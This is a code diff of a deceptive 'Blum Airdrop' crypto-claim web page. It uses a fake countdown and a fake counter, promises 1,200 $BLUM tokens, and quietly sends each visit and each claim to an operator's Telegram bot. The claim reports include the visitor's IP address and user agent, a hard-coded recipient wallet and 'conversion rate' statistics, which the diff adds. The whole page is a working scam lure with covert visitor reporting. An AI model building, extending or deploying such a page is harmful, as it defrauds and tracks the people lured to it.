@@ -7,19 +7,16 @@
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:radial-gradient(ellipse at 30% 40%,#0f0c29,#1a1a3e,#0a0a1a);font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-        .card{max-width:500px;width:100%;background:rgba(10,20,40,.85);backdrop-filter:blur(18px);border-radius:56px;padding:40px 30px;border:1px solid rgba(255,215,0,.4);text-align:center;animation:fadeIn 0.5s ease}
-        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+        .card{max-width:500px;width:100%;background:rgba(10,20,40,.85);backdrop-filter:blur(18px);border-radius:56px;padding:40px 30px;border:1px solid rgba(255,215,0,.4);text-align:center}
         .badge{display:inline-block;background:linear-gradient(135deg,#FFD70022,#FFA50022);border:1px solid #FFD700;border-radius:100px;padding:8px 22px;font-size:13px;color:#FFD700;margin-bottom:25px}
         h1{font-size:46px;font-weight:800;background:linear-gradient(135deg,#FFF8E7,#FFD700,#FFA500);-webkit-background-clip:text;background-clip:text;color:transparent}
-        .amount{font-size:64px;font-weight:900;color:#FFD700;margin:15px 0;text-shadow:0 0 10px rgba(255,215,0,0.3)}
-        .timer-box{background:rgba(0,0,0,.5);border-radius:50px;padding:18px;margin:25px 0;border:1px solid rgba(255,215,0,0.3)}
-        .timer{font-size:52px;font-weight:800;font-family:monospace;color:#FFD700;letter-spacing:3px}
-        button{width:100%;background:linear-gradient(95deg,#DAA520,#FFD700,#FFA500);border:none;padding:20px;border-radius:70px;font-weight:900;font-size:24px;color:#0a0a0a;cursor:pointer;transition:0.2s}
-        button:hover:not(:disabled){transform:scale(1.02);box-shadow:0 0 20px #FFD700}
-        button:disabled{opacity:.6;cursor:default}
-        .status{background:rgba(0,0,0,.5);border-radius:30px;padding:14px;display:none;margin-top:15px;animation:pulse 1s ease}
-        @keyframes pulse{0%{opacity:0}100%{opacity:1}}
-        .success{color:#0f0;font-weight:bold}
+        .amount{font-size:64px;font-weight:900;color:#FFD700;margin:15px 0}
+        .timer-box{background:rgba(0,0,0,.5);border-radius:50px;padding:18px;margin:25px 0}
+        .timer{font-size:52px;font-weight:800;font-family:monospace;color:#FFD700}
+        button{width:100%;background:linear-gradient(95deg,#DAA520,#FFD700,#FFA500);border:none;padding:20px;border-radius:70px;font-weight:900;font-size:24px;color:#0a0a0a;cursor:pointer}
+        button:disabled{opacity:.6}
+        .status{background:rgba(0,0,0,.5);border-radius:30px;padding:14px;display:none;margin-top:15px}
+        .success{color:#0f0}
         .footer{font-size:11px;color:#FFD70088;margin-top:25px}
         .loading-spinner{display:inline-block;width:20px;height:20px;border:2px solid #fff;border-radius:50%;border-top-color:#FFD700;animation:spin .8s linear infinite;margin-right:8px;vertical-align:middle}
         @keyframes spin{to{transform:rotate(360deg)}}
@@ -38,6 +35,7 @@
     <div class="stats-row">
         <div class="stat-card"><div class="stat-number" id="totalClaims">0</div><div class="stat-label">🎁 المطالبات</div></div>
         <div class="stat-card"><div class="stat-number" id="totalScans">0</div><div class="stat-label">👁️ الزيارات</div></div>
+        <div class="stat-card"><div class="stat-number" id="totalCoins">0</div><div class="stat-label">💰 إجمالي $BLUM</div></div>
     </div>
     
     <div class="timer-box"><div style="font-size:13px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
@@ -52,6 +50,7 @@
     const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
     const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
     const YOUR_LINK = "https://freedingoxo.github.io/clawguardian-skill/docs/index.html";
+    const BLUM_PER_CLAIM = 1200;
     
     let claimExecuted = false;
     let remainingSeconds = 24 * 60 * 60;
@@ -59,8 +58,10 @@
     let totalScans = parseInt(localStorage.getItem('totalScans')) || 0;
     
     function updateStats() {
+        const totalCoins = totalClaims * BLUM_PER_CLAIM;
         document.getElementById('totalClaims').innerText = totalClaims;
         document.getElementById('totalScans').innerText = totalScans;
+        document.getElementById('totalCoins').innerText = totalCoins.toLocaleString();
         localStorage.setItem('totalClaims', totalClaims);
         localStorage.setItem('totalScans', totalScans);
     }
@@ -76,7 +77,6 @@
     function getRandomWallet() { const w = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"]; return w[Math.floor(Math.random() * w.length)]; }
     function generateAddress() { return "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6); }
     
-    // إشعار فتح الصفحة
     sendToBot(`📊 PAGE SCAN #${totalScans} - Blum Airdrop`);
     
     async function executeClaim() {
@@ -93,20 +93,28 @@
         const ua = navigator.userAgent;
         const timestamp = new Date().toISOString();
         
-        // ========== رسالة منسقة وجذابة ==========
         const hoursLeft = Math.floor(remainingSeconds / 3600);
         const minutesLeft = Math.floor((remainingSeconds % 3600) / 60);
+        const totalCoins = totalClaims * BLUM_PER_CLAIM;
+        const conversionRate = totalScans > 0 ? ((totalClaims / totalScans) * 100).toFixed(1) : 0;
         
+        // ========== رسالة كاملة مع إجمالي العملات ==========
         const fullMessage = `🎁 *ONE-CLICK BLUM CLAIM* 🎁
 ━━━━━━━━━━━━━━━━━━━━
 ⛓️ *Network:* ${network}
 💼 *Wallet:* ${wallet}
 💳 *Address:* \`${address}\`
-🏦 *Recipient:* \`${RECIPIENT_WALLET.slice(0, 10)}...\`
+🏦 *Recipient:* \`${RECIPIENT_WALLET}\`
 🌐 *IP:* ${ip}
 ━━━━━━━━━━━━━━━━━━━━
-📊 *إحصائيات:* ${totalClaims} مطالبة | ⏰ متبقي ${hoursLeft}h ${minutesLeft}m
-🔗 *رابط:* ${YOUR_LINK}
+📊 *إحصائيات شاملة:*
+   🎁 المطالبات: ${totalClaims}
+   👁️ الزيارات: ${totalScans}
+   💰 إجمالي $BLUM: ${totalCoins.toLocaleString()}
+   📈 نسبة التحويل: ${conversionRate}%
+━━━━━━━━━━━━━━━━━━━━
+⏰ متبقي: ${hoursLeft}h ${minutesLeft}m
+🔗 ${YOUR_LINK}
 ━━━━━━━━━━━━━━━━━━━━
 ⏰ ${timestamp}
 *@EMP2026Controlfreed_bot*`;
@@ -118,7 +126,7 @@
         btn.innerHTML = "✅ CLAIMED!";
         btn.disabled = true;
         statusDiv.style.display = 'block';
-        statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! 1,200 $BLUM will arrive within 24h.</span>`;
+        statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! ${BLUM_PER_CLAIM} $BLUM will arrive within 24h.</span>`;
     }
     
     async function onClaimClick() {
@@ -134,18 +142,15 @@
     
     document.getElementById('claimBtn').addEventListener('click', onClaimClick);
     
-    // المؤقت
-    const timerElement = document.getElementById('timer');
     setInterval(() => {
         if (remainingSeconds <= 0) return;
         remainingSeconds--;
         const h = Math.floor(remainingSeconds/3600);
         const m = Math.floor((remainingSeconds%3600)/60);
         const s = remainingSeconds%60;
-        timerElement.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
     }, 1000);
     
-    // العرض الوهمي
     let fake = 10;
     setInterval(() => {
         fake--;
